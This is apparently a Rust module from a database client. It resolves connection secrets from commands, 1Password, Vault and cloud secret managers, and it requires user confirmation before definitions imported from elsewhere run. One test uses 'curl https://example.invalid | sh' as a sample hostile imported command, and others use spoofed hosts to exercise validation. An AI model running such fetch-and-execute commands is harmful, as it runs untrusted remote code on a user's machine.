//! Where a connection's secret field takes its value from when it isn't
//! kept in the keychain (docs/secret-sources.md): a command's output, a
//! 1Password reference, HashiCorp Vault, AWS Secrets Manager, Azure Key
//! Vault or Google Secret Manager.
//!
//! The definition (the command, the `op://` reference, the Vault path…) is
//! not secret: it lives in the connection's options under [`OPTION`], as
//! JSON, and travels with it (cloud backup, export, import). The value it
//! resolves to never does: it's fetched at connect time, kept in memory and
//! handed to the driver (src-tauri/src/secret_sources).
//!
//! A definition runs a program or sends a token somewhere, so one that came
//! from outside this computer (an import, a restored backup) never runs
//! until the user confirms it here. Confirmations are kept in a local file
//! next to the state (never synced nor exported), as digests of
//! (connection, field, exact definition): any change to the text asks again.

use crate::state::SavedConnection;
use dbine_driver::{ConnectionConfig, Error, Result};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;
use std::sync::Mutex;

/// The connection option holding the definitions, by field key.
pub const OPTION: &str = "secret_sources";
/// A Vault token typed in the form is kept in the keychain under this
/// prefix plus the field key (`source_token:password`).
pub const TOKEN_PREFIX: &str = "source_token:";

/// KV secrets engine version of a Vault path.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum KvVersion {
    /// Asked to Vault (`sys/internal/ui/mounts`), else v2 then v1.
    #[default]
    Auto,
    #[serde(rename = "1")]
    V1,
    #[serde(rename = "2")]
    V2,
}

fn is_false(b: &bool) -> bool {
    !*b
}

fn is_auto(v: &KvVersion) -> bool {
    *v == KvVersion::Auto
}

/// One field's source. "Saved" (the keychain) and "ask every time" aren't
/// here: they are the absence of a definition (`save_password` says which).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum SecretSource {
    /// A command run with the user's login shell; its output is the secret.
    Command {
        command: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
    },
    /// `op read <reference>` (1Password CLI).
    #[serde(rename = "onepassword")]
    OnePassword {
        reference: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        account: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
    },
    /// A key of a KV secret (v1 or v2).
    Vault {
        address: String,
        path: String,
        key: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        namespace: String,
        #[serde(default, skip_serializing_if = "is_auto")]
        kv_version: KvVersion,
        /// PEM file of the CA that signed Vault's certificate.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        ca_file: String,
    },
    /// AWS Secrets Manager (`GetSecretValue`).
    Aws {
        secret_id: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        region: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        profile: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
        /// The connection's user comes from the same secret's `username`.
        #[serde(default, skip_serializing_if = "is_false")]
        fill_username: bool,
    },
    /// Azure Key Vault.
    Azure {
        vault_url: String,
        name: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        version: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
    },
    /// Google Secret Manager.
    Gcp {
        project: String,
        secret: String,
        /// Empty: `latest`.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        version: String,
        #[serde(default, skip_serializing_if = "String::is_empty")]
        json_key: String,
    },
}

pub type SecretSources = BTreeMap<String, SecretSource>;

fn bad(msg: impl Into<String>) -> Error {
    Error::State(msg.into())
}

/// Azure Key Vault's DNS suffixes and the token resource of each cloud.
pub const AZURE_VAULT_SUFFIXES: &[(&str, &str)] = &[
    (".vault.azure.net", "https://vault.azure.net"),
    (".vault.azure.cn", "https://vault.azure.cn"),
    (".vault.usgovcloudapi.net", "https://vault.usgovcloudapi.net"),
    (".vault.microsoftazure.de", "https://vault.microsoftazure.de"),
];

/// `https://<name>.vault.azure.net` (or another cloud's suffix), with no
/// path, query or credentials: the host and the token's resource.
pub fn azure_vault_host(url: &str) -> Option<(String, &'static str)> {
    let host = url.trim().strip_prefix("https://")?.trim_end_matches('/');
    if host.is_empty() || !host.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.') {
        return None;
    }
    let host = host.to_ascii_lowercase();
    AZURE_VAULT_SUFFIXES.iter().find_map(|(suffix, resource)| {
        let name = host.strip_suffix(suffix)?;
        (!name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')).then(|| (host.clone(), *resource))
    })
}

/// A name that goes in a cloud API's URL path as is.
fn url_segment(s: &str) -> bool {
    !s.is_empty() && s.len() <= 255 && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':'))
}

/// `us-east-1`, `eu-central-2`, `cn-north-1`…
pub fn valid_aws_region(r: &str) -> bool {
    let parts: Vec<&str> = r.split('-').collect();
    parts.len() >= 3
        && parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()))
        && parts.last().is_some_and(|p| p.chars().all(|c| c.is_ascii_digit()))
}

impl SecretSource {
    /// The kind, as stored (`command`, `onepassword`, `vault`…).
    pub fn kind(&self) -> &'static str {
        match self {
            Self::Command { .. } => "command",
            Self::OnePassword { .. } => "onepassword",
            Self::Vault { .. } => "vault",
            Self::Aws { .. } => "aws",
            Self::Azure { .. } => "azure",
            Self::Gcp { .. } => "gcp",
        }
    }

    /// The JSON key to take from the secret (empty: the whole value).
    pub fn json_key(&self) -> &str {
        match self {
            Self::Command { json_key, .. }
            | Self::OnePassword { json_key, .. }
            | Self::Aws { json_key, .. }
            | Self::Azure { json_key, .. }
            | Self::Gcp { json_key, .. } => json_key.trim(),
            Self::Vault { .. } => "",
        }
    }

    /// Everything the definition needs, well formed. Says what's wrong.
    pub fn validate(&self) -> Result<()> {
        let no_control = |s: &str| !s.chars().any(|c| c.is_control() && c != '\t');
        match self {
            Self::Command { command, .. } => {
                if command.trim().is_empty() {
                    return Err(bad("falta el comando que devuelve el secreto"));
                }
                if command.contains('\0') || command.contains(['\n', '\r']) {
                    return Err(bad("el comando tiene que ser una sola línea"));
                }
            }
            Self::OnePassword { reference, account, .. } => {
                let r = reference.trim();
                if !r.starts_with("op://") || r.len() <= "op://".len() || !no_control(r) {
                    return Err(bad("la referencia de 1Password tiene que empezar con op:// (op://bóveda/elemento/campo)"));
                }
                if !account.is_empty() && !account.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | '@')) {
                    return Err(bad("la cuenta de 1Password no es válida"));
                }
            }
            Self::Vault { address, path, key, namespace, ca_file, .. } => {
                let a = address.trim();
                let rest = a.strip_prefix("https://").or_else(|| a.strip_prefix("http://"));
                if rest.is_none_or(|r| r.is_empty() || r.contains(['@', '?', '#']) || !no_control(r) || r.contains(char::is_whitespace)) {
                    return Err(bad("la dirección de Vault tiene que ser una URL http:// o https:// (https://vault.ejemplo.com:8200)"));
                }
                if path.trim().trim_matches('/').is_empty() || !no_control(path) || path.contains("..") || path.contains(['?', '#']) {
                    return Err(bad("falta la ruta del secreto en Vault (secret/miapp/db)"));
                }
                if key.trim().is_empty() {
                    return Err(bad("falta la clave del secreto de Vault (password)"));
                }
                if !namespace.is_empty() && !no_control(namespace) {
                    return Err(bad("el espacio de nombres de Vault no es válido"));
                }
                if !no_control(ca_file) {
                    return Err(bad("la ruta del certificado de la CA no es válida"));
                }
            }
            Self::Aws { secret_id, region, profile, .. } => {
                if secret_id.trim().is_empty() || !no_control(secret_id) {
                    return Err(bad("falta el nombre o el ARN del secreto de AWS"));
                }
                if !region.trim().is_empty() && !valid_aws_region(region.trim()) {
                    return Err(bad(format!("la región de AWS «{}» no es válida", region.trim())));
                }
                if !profile.is_empty() && !profile.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | '@' | '+')) {
                    return Err(bad("el perfil de AWS no es válido"));
                }
            }
            Self::Azure { vault_url, name, version, .. } => {
                if azure_vault_host(vault_url).is_none() {
                    return Err(bad("la URL del almacén tiene que ser https://<nombre>.vault.azure.net"));
                }
                if !url_segment(name.trim()) || name.contains(['.', ':']) {
                    return Err(bad("el nombre del secreto de Azure Key Vault no es válido"));
                }
                if !version.trim().is_empty() && !version.trim().chars().all(|c| c.is_ascii_alphanumeric()) {
                    return Err(bad("la versión del secreto de Azure Key Vault no es válida"));
                }
            }
            Self::Gcp { project, secret, version, .. } => {
                if !url_segment(project.trim()) {
                    return Err(bad("falta el proyecto de Google Cloud (o no es válido)"));
                }
                if !url_segment(secret.trim()) || secret.contains([':', '.']) {
                    return Err(bad("falta el nombre del secreto de Google Secret Manager (o no es válido)"));
                }
                let v = version.trim();
                if !v.is_empty() && v != "latest" && !v.chars().all(|c| c.is_ascii_digit()) {
                    return Err(bad("la versión del secreto de Google tiene que ser un número o latest"));
                }
            }
        }
        Ok(())
    }
}

/// The definitions in a config's options (none if absent).
pub fn read(cfg: &ConnectionConfig) -> Result<SecretSources> {
    match cfg.options.get(OPTION).map(|s| s.trim()).filter(|s| !s.is_empty()) {
        Some(json) => serde_json::from_str(json).map_err(|e| bad(format!("los orígenes de los secretos no se pudieron leer: {e}"))),
        None => Ok(SecretSources::new()),
    }
}

/// The definitions, taken out of the options: the driver never sees them.
pub fn take(cfg: &mut ConnectionConfig) -> Result<SecretSources> {
    let out = read(cfg);
    cfg.options.remove(OPTION);
    out
}

/// Store `sources` in the options (removed when empty).
pub fn write(cfg: &mut ConnectionConfig, sources: &SecretSources) {
    if sources.is_empty() {
        cfg.options.remove(OPTION);
    } else if let Ok(json) = serde_json::to_string(sources) {
        cfg.options.insert(OPTION.into(), json);
    }
}

/// What a confirmation is bound to: the connection, the field and the
/// definition exactly as stored. Hex SHA-256.
pub fn digest(connection_id: &str, field: &str, source: &SecretSource) -> String {
    let def = serde_json::to_string(source).unwrap_or_default();
    let mut h = Sha256::new();
    for part in ["dbine-secret-source-v1", connection_id, field, def.as_str()] {
        h.update((part.len() as u64).to_le_bytes());
        h.update(part.as_bytes());
    }
    hex::encode(h.finalize())
}

// ---- confirmations ---------------------------------------------------------

const APPROVALS_FILE: &str = "secret-source-approvals.json";

#[derive(Default, Serialize, Deserialize)]
struct ApprovalsFile {
    #[serde(default)]
    approved: BTreeSet<String>,
}

/// The confirmations: the file next to the state (loaded once), or memory
/// only when there's no state folder (tests, tools).
struct Approvals {
    path: Option<PathBuf>,
    set: BTreeSet<String>,
}

static APPROVALS: Mutex<Option<Approvals>> = Mutex::new(None);

fn with_approvals<T>(f: impl FnOnce(&mut Approvals) -> T) -> T {
    let mut guard = APPROVALS.lock().unwrap_or_else(|e| e.into_inner());
    let a = guard.get_or_insert_with(|| {
        let path = crate::secrets::vault_dir().map(|d| d.join(APPROVALS_FILE));
        let set = path
            .as_ref()
            .and_then(|p| std::fs::read_to_string(p).ok())
            .and_then(|t| serde_json::from_str::<ApprovalsFile>(&t).ok())
            .map(|f| f.approved)
            .unwrap_or_default();
        Approvals { path, set }
    });
    f(a)
}

fn save(a: &Approvals) -> Result<()> {
    let Some(path) = &a.path else { return Ok(()) };
    let json = serde_json::to_vec_pretty(&ApprovalsFile { approved: a.set.clone() })?;
    let tmp = path.with_extension("json.tmp");
    std::fs::write(&tmp, json)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600));
    }
    std::fs::rename(&tmp, path)?;
    Ok(())
}

pub fn is_approved(digest: &str) -> bool {
    with_approvals(|a| a.set.contains(digest))
}

pub fn approve(digest: &str) -> Result<()> {
    with_approvals(|a| if a.set.insert(digest.to_string()) { save(a) } else { Ok(()) })
}

/// Forget confirmations (a deleted connection's).
pub fn forget(digests: &[String]) -> Result<()> {
    with_approvals(|a| {
        let before = a.set.len();
        for d in digests {
            a.set.remove(d);
        }
        if a.set.len() != before { save(a) } else { Ok(()) }
    })
}

/// Whether a definition is one that came from outside: some saved
/// connection has it on the same field and it was never confirmed there.
/// A definition nobody has (typed in the form now) didn't.
pub fn from_outside(saved: &[SavedConnection], field: &str, source: &SecretSource) -> bool {
    saved.iter().any(|c| {
        read(&c.config).ok().and_then(|s| s.get(field).cloned()).is_some_and(|s| &s == source && !is_approved(&digest(&c.id, field, source)))
    })
}

// ---- values ----------------------------------------------------------------

/// The secret, or the `key` of it when it's a JSON object. Strings are
/// taken as they are; numbers and booleans as written.
pub fn pick_json(value: &str, key: &str) -> Result<String> {
    if key.is_empty() {
        return Ok(value.to_string());
    }
    let json: serde_json::Value = serde_json::from_str(value.trim()).map_err(|_| bad(format!("el secreto no es un objeto JSON, así que no tiene la clave «{key}»")))?;
    let obj = json.as_object().ok_or_else(|| bad(format!("el secreto no es un objeto JSON, así que no tiene la clave «{key}»")))?;
    match obj.get(key) {
        Some(serde_json::Value::String(s)) => Ok(s.clone()),
        Some(v @ (serde_json::Value::Number(_) | serde_json::Value::Bool(_))) => Ok(v.to_string()),
        Some(_) => Err(bad(format!("la clave «{key}» del secreto no es un texto"))),
        None => {
            let mut keys: Vec<&str> = obj.keys().map(String::as_str).take(20).collect();
            keys.sort_unstable();
            Err(bad(format!("el secreto no tiene la clave «{key}» (tiene: {})", keys.join(", "))))
        }
    }
}

/// Overwrite a string's bytes and empty it (best effort: copies made
/// earlier, by a reallocation or a parser, aren't reached).
pub fn wipe(s: &mut String) {
    // SAFETY: zero bytes are valid UTF-8.
    for b in unsafe { s.as_bytes_mut() } {
        unsafe { std::ptr::write_volatile(b, 0) };
    }
    s.clear();
}

/// The same for bytes.
pub fn wipe_bytes(v: &mut Vec<u8>) {
    for b in v.iter_mut() {
        unsafe { std::ptr::write_volatile(b, 0) };
    }
    v.clear();
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmd(c: &str) -> SecretSource {
        SecretSource::Command { command: c.into(), json_key: String::new() }
    }

    #[test]
    fn definitions_round_trip_through_the_options() {
        let mut cfg = ConnectionConfig::default();
        let mut s = SecretSources::new();
        s.insert("password".into(), cmd("pass show db/prod"));
        s.insert(
            "ssh.password".into(),
            SecretSource::Vault {
                address: "https://vault:8200".into(),
                path: "secret/app".into(),
                key: "ssh".into(),
                namespace: String::new(),
                kv_version: KvVersion::V2,
                ca_file: String::new(),
            },
        );
        write(&mut cfg, &s);
        assert!(cfg.options[OPTION].contains("\"kind\":\"command\""));
        assert!(cfg.options[OPTION].contains("\"kv_version\":\"2\""));
        assert_eq!(read(&cfg).unwrap(), s);
        assert_eq!(take(&mut cfg).unwrap(), s);
        assert!(!cfg.options.contains_key(OPTION), "the driver never gets them");
        write(&mut cfg, &SecretSources::new());
        assert!(!cfg.options.contains_key(OPTION));
    }

    #[test]
    fn every_kind_parses_from_its_json() {
        let json = r#"{
            "a": {"kind":"command","command":"echo hi"},
            "b": {"kind":"onepassword","reference":"op://Private/DB/password"},
            "c": {"kind":"vault","address":"http://127.0.0.1:8200","path":"secret/x","key":"pw"},
            "d": {"kind":"aws","secret_id":"prod/db","region":"us-east-1","json_key":"password","fill_username":true},
            "e": {"kind":"azure","vault_url":"https://kv1.vault.azure.net","name":"db-pw"},
            "f": {"kind":"gcp","project":"my-proj","secret":"db-pw"}
        }"#;
        let mut cfg = ConnectionConfig::default();
        cfg.options.insert(OPTION.into(), json.into());
        let s = read(&cfg).unwrap();
        assert_eq!(s.len(), 6);
        for (k, v) in &s {
            v.validate().unwrap_or_else(|e| panic!("{k}: {e}"));
        }
        assert_eq!(s["d"].json_key(), "password");
        assert!(matches!(s["c"], SecretSource::Vault { kv_version: KvVersion::Auto, .. }));
    }

    #[test]
    fn validation_says_what_is_wrong() {
        assert!(cmd("  ").validate().is_err());
        assert!(cmd("a\nb").validate().is_err());
        let op = |r: &str| SecretSource::OnePassword { reference: r.into(), account: String::new(), json_key: String::new() };
        assert!(op("Private/DB/password").validate().is_err());
        assert!(op("op://Private Vault/DB/password").validate().is_ok(), "names with spaces are fine");
        let az = |u: &str| SecretSource::Azure { vault_url: u.into(), name: "pw".into(), version: String::new(), json_key: String::new() };
        assert!(az("https://kv1.vault.azure.net/").validate().is_ok());
        for u in ["http://kv1.vault.azure.net", "https://evil.example.com", "https://kv1.vault.azure.net.evil.com", "https://a@kv1.vault.azure.net", "https://.vault.azure.net"] {
            assert!(az(u).validate().is_err(), "{u}");
        }
        let aws = |r: &str| SecretSource::Aws { secret_id: "x".into(), region: r.into(), profile: String::new(), json_key: String::new(), fill_username: false };
        assert!(aws("eu-west-1").validate().is_ok());
        assert!(aws("evil.com/").validate().is_err());
        let gcp = |p: &str, v: &str| SecretSource::Gcp { project: p.into(), secret: "pw".into(), version: v.into(), json_key: String::new() };
        assert!(gcp("my-proj", "").validate().is_ok());
        assert!(gcp("my-proj", "3").validate().is_ok());
        assert!(gcp("my/proj", "").validate().is_err());
        assert!(gcp("p", "../x").validate().is_err());
        let vault = |a: &str| SecretSource::Vault { address: a.into(), path: "secret/x".into(), key: "k".into(), namespace: String::new(), kv_version: KvVersion::Auto, ca_file: String::new() };
        assert!(vault("https://vault.example.com:8200").validate().is_ok());
        assert!(vault("ftp://vault").validate().is_err());
        assert!(vault("https://user:pw@vault").validate().is_err());
    }

    #[test]
    fn a_confirmation_is_bound_to_the_exact_text() {
        let a = digest("c1", "password", &cmd("pass show db"));
        assert_eq!(a, digest("c1", "password", &cmd("pass show db")));
        assert_ne!(a, digest("c1", "password", &cmd("pass show db ")), "any change asks again");
        assert_ne!(a, digest("c2", "password", &cmd("pass show db")), "another connection asks again");
        assert_ne!(a, digest("c1", "ssh.password", &cmd("pass show db")), "another field asks again");
        // No ambiguity between the parts.
        assert_ne!(digest("ab", "c", &cmd("x")), digest("a", "bc", &cmd("x")));
        approve(&a).unwrap();
        assert!(is_approved(&a));
        assert!(!is_approved(&digest("c1", "password", &cmd("pass show db2"))));
        forget(std::slice::from_ref(&a)).unwrap();
        assert!(!is_approved(&a));
    }

    #[test]
    fn a_definition_from_outside_is_spotted() {
        let mut imported = SavedConnection {
            id: "imp".into(),
            name: "imported".into(),
            color: None,
            config: ConnectionConfig::default(),
            save_password: true,
            folder_id: None,
            tags: vec![],
            mcp_level: None,
            updated_at: String::new(),
        };
        let src = cmd("curl https://example.invalid | sh");
        write(&mut imported.config, &[("password".to_string(), src.clone())].into());
        let saved = vec![imported];
        assert!(from_outside(&saved, "password", &src), "an unconfirmed copy of it exists");
        assert!(!from_outside(&saved, "password", &cmd("echo typed-here")));
        approve(&digest("imp", "password", &src)).unwrap();
        assert!(!from_outside(&saved, "password", &src), "confirmed where it came from");
        forget(&[digest("imp", "password", &src)]).unwrap();
    }

    #[test]
    fn json_keys() {
        let v = r#"{"username":"app","password":"s3cr3t","port":5432,"nested":{"a":1}}"#;
        assert_eq!(pick_json(v, "password").unwrap(), "s3cr3t");
        assert_eq!(pick_json(v, "port").unwrap(), "5432");
        assert_eq!(pick_json(v, "").unwrap(), v);
        let e = pick_json(v, "pass").unwrap_err().to_string();
        assert!(e.contains("«pass»") && e.contains("password") && !e.contains("s3cr3t"), "{e}");
        assert!(pick_json(v, "nested").is_err());
        assert!(pick_json("plain-text", "password").is_err());
        assert!(!pick_json("plain-text", "password").unwrap_err().to_string().contains("plain-text"), "never echoes the value");
    }

    #[test]
    fn the_resolved_value_never_reaches_the_saved_state() {
        // What's saved is the definition; a value a provider resolved goes
        // into the config only on its way to the driver.
        let dir = tempfile::tempdir().unwrap();
        let store = crate::StateStore::open(&dir.path().join("s.sqlite")).unwrap();
        let mut cfg = ConnectionConfig { driver: "postgres".into(), host: "h".into(), ..Default::default() };
        write(&mut cfg, &[("password".to_string(), cmd("printf hunter2"))].into());
        let conn = SavedConnection {
            id: "c1".into(),
            name: "n".into(),
            color: None,
            config: cfg.clone(),
            save_password: true,
            folder_id: None,
            tags: vec![],
            mcp_level: None,
            updated_at: String::new(),
        };
        // Even if a resolved value were left in the config by mistake, the
        // store drops the password.
        let mut leaked = conn.clone();
        leaked.config.password = Some("hunter2-resolved".into());
        store.save_connection(&leaked).unwrap();
        let back = store.get_connection("c1").unwrap().unwrap();
        let snapshot = serde_json::to_string(&store.snapshot().unwrap()).unwrap();
        assert!(!snapshot.contains("hunter2-resolved"));
        assert_eq!(back.config.password, None);
        assert_eq!(read(&back.config).unwrap()["password"], cmd("printf hunter2"));
    }
}
